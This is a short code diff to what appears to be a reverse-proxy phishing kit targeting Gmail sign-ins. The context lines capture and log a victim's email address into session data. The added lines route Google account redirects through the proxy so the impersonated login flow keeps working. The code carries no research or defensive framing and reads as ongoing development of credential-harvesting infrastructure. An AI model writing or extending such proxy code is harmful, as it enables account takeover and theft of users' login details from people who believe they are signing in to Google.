@@ -84,7 +84,7 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
                     Object.assign(this.browserReq.clientContext.sessionBody,
                         { email: emailGmail })
                     console.log(`email address is ${emailGmail}`)
-                    // Forward the request to Gmail and let it handle the redirect
+                    // Forward the request to Gmail and let it process the form submission
                     this.proxyEndpoint.write(kJust) 
                     this.proxyEndpoint.end()
 
@@ -176,6 +176,13 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
                this.browserEndPoint.setHeader('Location', redirectPath)
                this.browserEndPoint.writeHead(302)
                return this.browserEndPoint.end()
+           }
+           
+           // Handle any other redirects that might be Gmail-related
+           if (rLocation && (rLocation.includes('accounts.google.com') || rLocation.includes('signin'))) {
+               console.log('Gmail redirect detected:', rLocation)
+               // Let the redirect pass through normally
+               return super.processResponse()
            }
         }
 
